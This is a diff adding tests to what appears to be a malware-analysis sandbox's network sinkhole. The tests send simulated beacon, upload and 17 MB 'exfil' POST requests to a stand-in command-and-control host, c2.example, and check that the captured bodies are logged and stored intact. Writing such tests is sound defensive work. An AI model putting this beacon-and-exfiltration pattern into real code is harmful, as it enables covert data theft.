@@ -26,6 +26,8 @@ async function errorOf(call: () => Promise<unknown>): Promise<string> {
   return 'no error';
 }
 
+const sha256 = async (data: BufferSource) => new Uint8Array(await crypto.subtle.digest('SHA-256', data)).toHex();
+
 describe('Sandbox state', () => {
   it('registers, lists and deletes sandboxes per principal', async () => {
     const stub = stubFor('reg');
@@ -88,6 +90,59 @@ describe('network sinkhole', () => {
     });
     expect(event!.headers['user-agent']).toBe('implant/1.0');
     expect(event!.response).toEqual({ status: 200, rule: null });
+  });
+
+  it('keeps binary bodies intact and saves large ones as artifacts', async () => {
+    const stub = stubFor('sink-binary');
+    await stub.create(config('sink-binary', { network: 'sinkhole' }));
+    const sinkhole = exports.NetworkSinkhole({
+      props: {
+        sandboxId: env.SANDBOX.idFromName('test/sink-binary').toString(),
+        owner: { principal: 'test', name: 'sink-binary' },
+      },
+    });
+
+    const beacon = new Uint8Array([0xde, 0xad, 0x00, 0xbe, 0xef]);
+    await sinkhole.fetch('https://c2.example/beacon', { method: 'POST', body: beacon });
+    await sinkhole.fetch('https://c2.example/upload', { method: 'POST', body: 'A'.repeat(100_000) });
+    // Larger than two R2 multipart parts, sent in uneven chunks.
+    const archive = new Uint8Array(17 * 1024 * 1024);
+    const block = crypto.getRandomValues(new Uint8Array(65_536));
+    for (let offset = 0; offset < archive.length; offset += block.length) archive.set(block, offset);
+    archive[archive.length - 1] = 0x42;
+    const chunks = new ReadableStream<Uint8Array>({
+      start(controller) {
+        for (let offset = 0; offset < archive.length; offset += 1_000_003) {
+          controller.enqueue(archive.subarray(offset, offset + 1_000_003));
+        }
+        controller.close();
+      },
+    });
+    await sinkhole.fetch('https://c2.example/exfil', { method: 'POST', body: chunks });
+
+    await expect.poll(() => stub.networkLog(0, 10)).toHaveLength(3);
+    const [binary, large, exfil] = await stub.networkLog(0, 10);
+    expect(binary).toMatchObject({ bodySize: 5, bodyEncoding: 'base64', bodyArtifact: null });
+    expect(Uint8Array.fromBase64(binary!.bodyPreview)).toEqual(beacon);
+    expect(large).toMatchObject({ bodySize: 100_000, bodyPreview: 'A'.repeat(4096), bodyEncoding: 'utf8' });
+    expect(large!.bodyArtifact).toMatch(/^sinkhole\/sink-binary\/.+\.bin$/);
+    expect(await (await env.BUCKET.get(`artifacts/test/${large!.bodyArtifact}`))!.text()).toBe('A'.repeat(100_000));
+    expect(exfil!.bodySize).toBe(archive.length);
+    const saved = await env.BUCKET.get(`artifacts/test/${exfil!.bodyArtifact}`);
+    expect(saved!.customMetadata).toEqual({ sandbox: 'sink-binary', sinkhole: 'POST https://c2.example/exfil' });
+    expect(saved!.size).toBe(archive.length);
+    expect(await sha256(await saved!.arrayBuffer())).toBe(await sha256(archive));
+  });
+
+  it('keeps only the preview without an owner', async () => {
+    const stub = stubFor('sink-anon');
+    await stub.create(config('sink-anon', { network: 'sinkhole' }));
+    const sinkhole = exports.NetworkSinkhole({
+      props: { sandboxId: env.SANDBOX.idFromName('test/sink-anon').toString() },
+    });
+    await sinkhole.fetch('https://c2.example/upload', { method: 'POST', body: 'A'.repeat(10_000) });
+    await expect.poll(() => stub.networkLog(0, 10)).toHaveLength(1);
+    expect((await stub.networkLog(0, 10))[0]).toMatchObject({ bodySize: 10_000, bodyArtifact: null });
   });
 
   it('answers with the first matching rule', async () => {
